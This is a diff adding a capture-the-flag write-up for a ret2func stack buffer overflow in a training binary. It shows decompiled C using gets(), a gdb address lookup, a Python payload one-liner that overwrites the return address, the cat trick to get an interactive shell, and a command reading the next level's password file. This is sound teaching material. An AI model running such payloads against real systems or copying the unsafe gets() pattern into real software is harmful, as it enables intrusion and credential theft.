@@ -1,0 +1,58 @@
+# Level 1 — Ret2func Stack Buffer Overflow
+
+## Introduction
+This level introduces stack-based buffer overflows. We are given a binary that reads user input via the unsafe `gets()` function. While the `main` function does not call it, there is a helper function `run` in the binary that spawns a shell. We must redirect execution flow to this `run` function.
+
+## Analysis
+The reconstructed C code of the binary is as follows:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void run(void) {
+    fwrite("Good... Wait what?\n", 1, 19, stdout);
+    system("/bin/sh");
+}
+
+int main(void) {
+    char local_50[76];
+    gets(local_50);
+    return 0;
+}
+```
+
+Since the program uses `gets()`, which does not perform bounds checking on the input, we can write past the end of the `local_50` buffer (which holds 76 bytes) and overwrite the saved return address (EIP) of `main`.
+
+### Finding the Target Address
+We disassemble the binary using `gdb` to find the address of the `run` function:
+```gdb
+(gdb) info functions run
+All functions matching regular expression "run":
+
+Non-debugging symbols:
+0x08048444  run
+```
+
+The address of the `run` function is `0x08048444`.
+
+### Finding the Offset
+The buffer `local_50` starts exactly 76 bytes before the saved return address on the stack. Thus, writing 76 bytes of padding followed by the address of `run` will overwrite EIP with the address of `run`.
+
+When `main` executes the `return` statement, it pops the overwritten value into the instruction pointer (EIP), transferring control to the `run` function.
+
+## Exploit
+We generate the payload (reversing the address to little-endian representation `\x44\x84\x04\x08`):
+```bash
+python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
+```
+
+To run the exploit and keep the stdin stream open (so we can interact with the shell), we use the `cat` trick:
+```bash
+(cat /tmp/payload; cat) | ./level1
+```
+
+Once the shell is spawned, we can retrieve the password for `level2`:
+```bash
+cat /home/user/level2/.pass
+```
